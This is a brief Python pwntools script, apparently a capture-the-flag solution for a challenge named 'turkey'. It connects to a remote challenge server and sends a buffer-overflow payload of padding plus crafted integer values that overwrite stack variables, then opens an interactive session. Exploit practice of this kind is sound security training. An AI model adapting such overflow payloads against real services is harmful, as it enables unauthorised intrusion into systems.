from pwn import *
context.log_level='DEBUG'
#p=process("./turkey")
p=remote('challenges.auctf.com',30011)
p.recvuntil("I got!\n")
p.recvline()
payload = 'A'*16
payload += '\x2a\x00\x00\x00'
payload += '\x15\x00\x00\x00'
payload += '\x63\x74\x66\x00'
payload += '\xcc\xff\xff\xff'
payload += '\x37\x13\x00\x00'
payload += 'A'*4
payload += 'B'*4
p.sendline(payload)
p.interactive()